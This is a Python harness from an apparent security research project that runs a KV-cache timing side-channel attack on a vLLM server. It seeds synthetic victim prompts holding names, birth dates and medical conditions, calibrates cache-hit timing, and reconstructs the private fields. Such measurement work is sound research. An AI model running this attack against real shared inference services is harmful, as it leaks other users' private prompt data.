import argparse
import datetime
import json
import time
import uuid
import urllib.request
import urllib.parse
from pathlib import Path

import numpy as np
from openai import OpenAI
from transformers import AutoTokenizer

from kv_attack import (
    VLLM_BASE_URL, VLLM_HOST, VLLM_PORT, MODEL_ID, BLOCK_SIZE,
    detect_has_bos,
)
from kv_attack.victim_seeder import (
    build_aligned_system_prompt,
    seed_victim_prefix,
    build_private_block,
)
from kv_attack.attacker import calibrate_threshold
from kv_attack.cache_eviction import evict_cache
from kv_attack.reconstructor import reconstruct_victim, ReconstructionResult


# ── Health check ──────────────────────────────────────────────────────────────

def _health_check(client: OpenAI) -> bool:
    try:
        resp = client.completions.create(
            model=MODEL_ID, prompt="Hello", max_tokens=1, temperature=0.0
        )
        _ = resp.choices[0].text
        print(f"[harness] ✓ vLLM health check passed (model={MODEL_ID})")
        return True
    except Exception as exc:
        print(
            f"[harness] ✗ vLLM health check FAILED: {exc}\n"
            f"  Run: source .venv/bin/activate && bash start_vllm.sh"
        )
        return False


def _check_apc_enabled() -> bool:
    try:
        parsed = urllib.parse.urlparse(VLLM_BASE_URL)
        metrics_url = urllib.parse.urlunparse(
            parsed._replace(path="/metrics", query="", fragment="")
        )
        with urllib.request.urlopen(metrics_url, timeout=5) as resp:
            text = resp.read().decode()
        if "vllm:gpu_prefix_cache_hit_rate_perc" in text:
            print("[harness] ✓ APC metric found in Prometheus output.")
            return True
        else:
            print("[harness] ⚠ APC metric NOT found.")
            return False
    except Exception:
        print("[harness] ⚠ Cannot reach Prometheus /metrics. Proceeding.")
        return True


# ── Main attack runner ────────────────────────────────────────────────────────

def run_attack(
    n_victims   : int  = 50,
    output_path : str  = "experiments/results/kv_attack_results.json",
    seed        : int  = 42,
    known_dob   : bool = True,
) -> dict:

    run_id    = f"week10-baseline-{datetime.date.today().isoformat()}"
    client    = OpenAI(base_url=VLLM_BASE_URL, api_key="EMPTY")
    tokenizer = AutoTokenizer.from_pretrained(MODEL_ID)

    print("\n" + "=" * 65)
    print(f"[harness] KV-Cache Timing Attack — Week 10 Baseline")
    print(f"[harness] Run ID  : {run_id}")
    print(f"[harness] Model   : {MODEL_ID}")
    print(f"[harness] Victims : {n_victims}  |  Seed: {seed}")
    print(f"[harness] known_dob={known_dob}")
    print("=" * 65 + "\n")

    # ── Phase 0: Health check ─────────────────────────────────────────────────
    if not _health_check(client):
        raise SystemExit("Aborting: vLLM not reachable.")
    _check_apc_enabled()

    # ── Phase 1: Block-aligned system prefix ─────────────────────────────────
    print("\n[harness] PHASE 1 — Building block-aligned system prefix...")
    system_prefix, n_prefix_tokens = build_aligned_system_prompt(
        tokenizer, has_bos=detect_has_bos(MODEL_ID)
    )
    n_prefix_blocks = (1 + n_prefix_tokens) // BLOCK_SIZE
    print(f"[harness] System prefix : {n_prefix_tokens} tokens "
          f"(+ BOS) → {n_prefix_blocks} complete blocks")
    print(f"[harness] Alignment check: "
          f"(1 + {n_prefix_tokens}) % {BLOCK_SIZE} = "
          f"{(1 + n_prefix_tokens) % BLOCK_SIZE}  ← must be 0")
    assert (1 + n_prefix_tokens) % BLOCK_SIZE == 0, \
        "System prefix not block-aligned."

    # ── Phase 2: Seed victims ─────────────────────────────────────────────────
    print("\n[harness] PHASE 2 — Seeding victims...")
    victim_records = seed_victim_prefix(
        client, tokenizer, system_prefix,
        n_victims=n_victims, seed=seed,
    )
    if not victim_records:
        raise RuntimeError("No victims seeded — check vLLM connection.")

    avg_priv_blocks = np.mean([r["n_private_blocks"] for r in victim_records])
    print(f"[harness] Average private blocks per victim: {avg_priv_blocks:.1f}")
    if avg_priv_blocks < 100:
        print("[harness] ⚠ WARNING: < 100 private blocks. "
              "Timing gap may be too small on GB10.")

    # ── Phase 3: Calibrate threshold ─────────────────────────────────────────
    print("\n[harness] PHASE 3 — Calibrating timing threshold...")

    # ── Miss prompt factory (critical fix) ───────────────────────────────────
    # Each call to miss_prompt_factory() returns a UNIQUE prompt that has
    # never been in the KV cache. We use a UUID hex string as the "name"
    # field. Since {name} is in the first private block, a different UUID
    # makes block N (first private block) unique, which cascades via the
    # SHA-256 hash chain to make ALL 193+ private blocks unique cold misses.
    #
    # Without this: vLLM caches the miss prompt after the first measurement.
    # Measurements 2-N become hits → miss distribution bimodal → std=51ms
    # → KS test fails. With unique prompts: all N measurements are true
    # cold misses → std ≈ 2-5 ms → KS test easily passes.
    #
    def miss_prompt_factory() -> str:
        # UUID hex[:12] gives 12 fixed hex chars → consistent tokenization
        # (always tokenises as ~3-4 tokens regardless of content)
        unique_name = f"MISS{uuid.uuid4().hex[:12].upper()}"
        return system_prefix + " " + build_private_block(
            name      = unique_name,
            dob       = "1900-01-01",
            condition = "FAKE_CONDITION_XYZ",
        )

    calibration = calibrate_threshold(
        client,
        known_cached_prompt = victim_records[0]["prompt"],
        miss_prompt_factory = miss_prompt_factory,
        n_samples           = 200,
    )
    threshold_ms = calibration["threshold_ms"]
    print(f"[harness] Threshold : {threshold_ms:.2f} ms  "
          f"(delta={calibration['delta_ms']:.2f} ms, "
          f"p={calibration['ks_p_value']:.2e})")
    print(f"[harness] Recommended N_REPEATS for 99% SR: "
          f"{calibration['recommended_n_rpts']}")

    # ── Phase 4: Attack each victim ───────────────────────────────────────────
    print(f"\n[harness] PHASE 4 — Attacking {len(victim_records)} victims...")
    results: list[ReconstructionResult] = []
    t_attack_start = time.perf_counter()

    for i, record in enumerate(victim_records):
        gt = record["ground_truth"]
        print(f"\n[harness] ── Victim {i + 1}/{len(victim_records)} "
              f"(GT: name='{gt['name']}' | cond='{gt['condition']}') ──")

        # (a) Evict entire cache
        evict_cache(client, base_url=VLLM_BASE_URL)

        # (b) Re-seed ONLY this victim
        try:
            client.completions.create(
                model=MODEL_ID, prompt=record["prompt"],
                max_tokens=1, temperature=0.0,
            )
        except Exception as exc:
            print(f"[harness] WARNING: re-seed of victim {i} failed: {exc}")
            continue

        # (c) Reconstruct
        result = reconstruct_victim(
            client        = client,
            tokenizer     = tokenizer,
            system_prefix = system_prefix,
            threshold_ms  = threshold_ms,
            victim_record = record,
            known_dob     = known_dob,
            candidate_seed= seed * 1000 + i,
        )
        results.append(result)

        gt_match = "✓ EXACT" if result.exact_match else f"TRR={result.token_recovery_rate:.2f}"
        conf     = "confirmed" if result.confirmed_hit else "best-guess"
        print(f"[harness] Victim {i + 1} → {gt_match} ({conf})  "
              f"API calls: {result.total_api_calls}  ARPT: {result.arpt}")

    total_attack_time = time.perf_counter() - t_attack_start

    # ── Phase 5: Aggregate and write ─────────────────────────────────────────
    if not results:
        raise RuntimeError("No results — all victims failed.")

    trr_vals   = [r.token_recovery_rate for r in results]
    sr_vals    = [int(r.exact_match)     for r in results]
    arpt_vals  = [r.arpt                 for r in results]
    calls_vals = [r.total_api_calls      for r in results]
    conf_rate  = float(np.mean([int(r.confirmed_hit) for r in results]))

    rng_boot = np.random.default_rng(seed)
    boot_arpts = [
        float(np.mean(rng_boot.choice(arpt_vals, size=len(arpt_vals), replace=True)))
        for _ in range(10_000)
    ]
    arpt_ci = (float(np.percentile(boot_arpts, 2.5)),
               float(np.percentile(boot_arpts, 97.5)))

    aggregate = {
        "n_victims"            : len(results),
        "mean_trr"             : round(float(np.mean(trr_vals)), 4),
        "success_rate"         : round(float(np.mean(sr_vals)),  4),
        "confirmed_hit_rate"   : round(conf_rate, 4),
        "mean_arpt"            : round(float(np.mean(arpt_vals)), 2),
        "arpt_ci_95"           : [round(x, 2) for x in arpt_ci],
        "mean_total_api_calls" : round(float(np.mean(calls_vals)), 1),
        "mean_timing_gap_ms"   : round(calibration["delta_ms"], 2),
        "ks_p_value"           : calibration["ks_p_value"],
        "total_attack_time_s"  : round(total_attack_time, 1),
        "known_dob"            : known_dob,
        "trr_note"             : (
            "TRR over {name, condition} only — DOB given as prior"
            if known_dob else
            "TRR over {name, condition, dob}"
        ),
        "arpt_note"            : "ARPT = API calls / vocab tokens in recovered fields (Papers 1-5)",
        "target_trr"           : 0.85,
        "target_sr"            : 0.80,
        "trr_target_met"       : float(np.mean(trr_vals)) >= 0.85,
        "sr_target_met"        : float(np.mean(sr_vals))  >= 0.80,
    }

    output = {
        "run_id"          : run_id,
        "framework"       : "vllm",
        "vllm_version"    : "0.27.1",
        "model"           : MODEL_ID,
        "hardware"        : "NVIDIA GB10 (119.7 GB unified memory, Blackwell)",
        "apc_enabled"     : True,
        "chunked_prefill" : False,
        "cache_salt"      : False,
        "note_cache_salt" : "--cache-salt does not exist in vLLM 0.27.1",
        "kv_cache_cap"    : "2 GB (--kv-cache-memory-bytes 2147483648)",
        "scenario"        : "S2",
        "n_prefix_blocks" : (1 + n_prefix_tokens) // BLOCK_SIZE,
        "calibration"     : calibration,
        "results": [
            {
                "victim_id"          : r.victim_id,
                "ground_truth"       : r.ground_truth,
                "recovered"          : r.recovered,
                "token_recovery_rate": round(r.token_recovery_rate, 4),
                "exact_match"        : r.exact_match,
                "confirmed_hit"      : r.confirmed_hit,
                "total_api_calls"    : r.total_api_calls,
                "arpt"               : r.arpt,
                "n_private_blocks"   : r.n_private_blocks,
                "top_scan_results"   : r.scan_results,
            }
            for r in results
        ],
        "aggregate": aggregate,
    }

    out_path = Path(output_path)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(output, indent=2))
    print(f"\n[harness] Results written → {out_path}")

    print("\n" + "=" * 65)
    print("[harness] ATTACK SUMMARY — WEEK 10 BASELINE")
    print("=" * 65)
    print(f"  Victims attacked      : {aggregate['n_victims']}")
    print(f"  Mean TRR              : {aggregate['mean_trr']:.4f}  "
          f"(target >= 0.85 -> {'✓' if aggregate['trr_target_met'] else '✗'})")
    print(f"  Success Rate (exact)  : {aggregate['success_rate']:.4f}  "
          f"(target >= 0.80 -> {'✓' if aggregate['sr_target_met'] else '✗'})")
    print(f"  Confirmed-hit rate    : {aggregate['confirmed_hit_rate']:.4f}")
    print(f"  Mean ARPT             : {aggregate['mean_arpt']} "
          f"[95% CI: {aggregate['arpt_ci_95']}]")
    print(f"  Mean timing gap       : {aggregate['mean_timing_gap_ms']} ms  "
          f"(KS p = {aggregate['ks_p_value']:.2e})")
    print(f"  Total attack time     : {aggregate['total_attack_time_s']} s "
          f"({aggregate['total_attack_time_s'] / 60:.1f} min)")
    print("=" * 65)

    return output


# ── CLI ───────────────────────────────────────────────────────────────────────

def main() -> None:
    p = argparse.ArgumentParser(
        description="KV-cache timing side-channel attack harness (Week 10)"
    )
    p.add_argument("--n-victims",   type=int, default=50)
    p.add_argument("--output",      type=str,
                   default="experiments/results/kv_attack_results.json")
    p.add_argument("--seed",        type=int, default=42)
    p.add_argument("--recover-dob", action="store_true", default=False)
    args = p.parse_args()

    run_attack(
        n_victims   = args.n_victims,
        output_path = args.output,
        seed        = args.seed,
        known_dob   = not args.recover_dob,
    )


if __name__ == "__main__":
    main()